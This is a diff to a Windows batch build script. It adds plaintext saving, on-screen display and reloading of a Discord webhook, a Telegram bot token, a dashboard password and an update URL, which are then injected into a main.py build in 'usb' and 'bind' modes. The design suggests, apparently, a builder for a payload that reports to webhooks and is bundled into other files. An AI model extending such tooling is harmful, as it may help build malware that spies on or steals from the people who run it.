@@ -37,6 +37,27 @@ echo.
 REM Ask for configuration values
 echo [1/6] Configuration
 echo.
+
+REM Check if saved config exists
+if exist config.txt (
+    echo   Found saved configuration (config.txt):
+    echo.
+    for /f "tokens=1,* delims==" %%a in (config.txt) do (
+        if "%%a"=="DISCORD_WEBHOOK" echo     Discord Webhook: %%b
+        if "%%a"=="DISCORD_USERNAME" echo     Discord Name: %%b
+        if "%%a"=="DASHBOARD_PASSWORD" echo     Dashboard Password: %%b
+        if "%%a"=="TELEGRAM_BOT_TOKEN" echo     Telegram Token: %%b
+        if "%%a"=="TELEGRAM_CHAT_ID" echo     Telegram Chat ID: %%b
+        if "%%a"=="UPDATE_URL" echo     Update URL: %%b
+    )
+    echo.
+    set /p "USE_SAVED=  Use saved config? (y/n): "
+    if /i "!USE_SAVED!"=="y" goto :usb_load_config
+    echo   Entering new configuration...
+    echo.
+)
+
+:usb_ask_config
 set "DISCORD_WEBHOOK="
 set /p "DISCORD_WEBHOOK=  Discord Webhook URL (leave blank to skip): "
 set "DISCORD_USERNAME=IGR"
@@ -69,6 +90,31 @@ if "%HAS_TELEGRAM%"=="0" echo   NOTE: Telegram not configured, using Discord onl
 if not defined DASHBOARD_PASSWORD echo   WARNING: DASHBOARD_PASSWORD is empty.
 
 echo   Config ready.
+
+REM Save config for next time
+(
+    echo DISCORD_WEBHOOK=%DISCORD_WEBHOOK%
+    echo DISCORD_USERNAME=%DISCORD_USERNAME%
+    echo DASHBOARD_PASSWORD=%DASHBOARD_PASSWORD%
+    echo TELEGRAM_BOT_TOKEN=%TELEGRAM_BOT_TOKEN%
+    echo TELEGRAM_CHAT_ID=%TELEGRAM_CHAT_ID%
+    echo UPDATE_URL=%UPDATE_URL%
+) > config.txt
+echo   Configuration saved to config.txt for next build.
+goto :usb_config_done
+
+:usb_load_config
+for /f "tokens=1,* delims==" %%a in (config.txt) do (
+    if "%%a"=="DISCORD_WEBHOOK" set "DISCORD_WEBHOOK=%%b"
+    if "%%a"=="DISCORD_USERNAME" set "DISCORD_USERNAME=%%b"
+    if "%%a"=="DASHBOARD_PASSWORD" set "DASHBOARD_PASSWORD=%%b"
+    if "%%a"=="TELEGRAM_BOT_TOKEN" set "TELEGRAM_BOT_TOKEN=%%b"
+    if "%%a"=="TELEGRAM_CHAT_ID" set "TELEGRAM_CHAT_ID=%%b"
+    if "%%a"=="UPDATE_URL" set "UPDATE_URL=%%b"
+)
+echo   Loaded saved config.
+
+:usb_config_done
 
 REM Create build copy of main.py with injected values
 echo.
@@ -252,6 +298,27 @@ echo.
 REM Ask for configuration values
 echo [1/7] Configuration
 echo.
+
+REM Check if saved config exists
+if exist config.txt (
+    echo   Found saved configuration (config.txt):
+    echo.
+    for /f "tokens=1,* delims==" %%a in (config.txt) do (
+        if "%%a"=="DISCORD_WEBHOOK" echo     Discord Webhook: %%b
+        if "%%a"=="DISCORD_USERNAME" echo     Discord Name: %%b
+        if "%%a"=="DASHBOARD_PASSWORD" echo     Dashboard Password: %%b
+        if "%%a"=="TELEGRAM_BOT_TOKEN" echo     Telegram Token: %%b
+        if "%%a"=="TELEGRAM_CHAT_ID" echo     Telegram Chat ID: %%b
+        if "%%a"=="UPDATE_URL" echo     Update URL: %%b
+    )
+    echo.
+    set /p "USE_SAVED=  Use saved config? (y/n): "
+    if /i "!USE_SAVED!"=="y" goto :bind_load_config
+    echo   Entering new configuration...
+    echo.
+)
+
+:bind_ask_config
 set "DISCORD_WEBHOOK="
 set /p "DISCORD_WEBHOOK=  Discord Webhook URL (leave blank to skip): "
 set "DISCORD_USERNAME=IGR"
@@ -279,6 +346,31 @@ if "%HAS_DISCORD%"=="0" if "%HAS_TELEGRAM%"=="0" (
 )
 
 echo   Config ready.
+
+REM Save config for next time
+(
+    echo DISCORD_WEBHOOK=%DISCORD_WEBHOOK%
+    echo DISCORD_USERNAME=%DISCORD_USERNAME%
+    echo DASHBOARD_PASSWORD=%DASHBOARD_PASSWORD%
+    echo TELEGRAM_BOT_TOKEN=%TELEGRAM_BOT_TOKEN%
+    echo TELEGRAM_CHAT_ID=%TELEGRAM_CHAT_ID%
+    echo UPDATE_URL=%UPDATE_URL%
+) > config.txt
+echo   Configuration saved to config.txt for next build.
+goto :bind_config_done
+
+:bind_load_config
+for /f "tokens=1,* delims==" %%a in (config.txt) do (
+    if "%%a"=="DISCORD_WEBHOOK" set "DISCORD_WEBHOOK=%%b"
+    if "%%a"=="DISCORD_USERNAME" set "DISCORD_USERNAME=%%b"
+    if "%%a"=="DASHBOARD_PASSWORD" set "DASHBOARD_PASSWORD=%%b"
+    if "%%a"=="TELEGRAM_BOT_TOKEN" set "TELEGRAM_BOT_TOKEN=%%b"
+    if "%%a"=="TELEGRAM_CHAT_ID" set "TELEGRAM_CHAT_ID=%%b"
+    if "%%a"=="UPDATE_URL" set "UPDATE_URL=%%b"
+)
+echo   Loaded saved config.
+
+:bind_config_done
 
 REM Inject config into main.py
 echo.
